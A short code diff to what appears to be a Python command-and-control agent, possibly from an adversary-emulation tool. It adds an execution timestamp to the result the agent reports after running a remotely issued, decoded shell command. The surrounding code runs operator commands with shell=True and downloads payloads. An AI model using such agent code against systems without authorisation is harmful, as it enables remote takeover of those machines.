@@ -1,4 +1,5 @@
 import argparse
+import datetime
 import json
 import os
 import platform
@@ -62,11 +63,12 @@ class OperationLoop:
     def _execute_instruction(self, i):
         print('[+] Running instruction: %s' % i['id'])
         cmd = self._decode_bytes(i['command'])
+        execution_timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         try:
             output = subprocess.check_output(cmd, shell=True, timeout=i['timeout'])
         except subprocess.CalledProcessError as e:
             output = e.output
-        return dict(output=self._encode_string(output.decode('utf-8', errors='ignore')), pid=os.getpid(), status=0, id=i['id']), i['sleep']
+        return dict(output=self._encode_string(output.decode('utf-8', errors='ignore')), pid=os.getpid(), status=0, id=i['id'], agent_reported_time=execution_timestamp), i['sleep']
 
     def _download_payloads(self, payloads):
         for p in payloads:
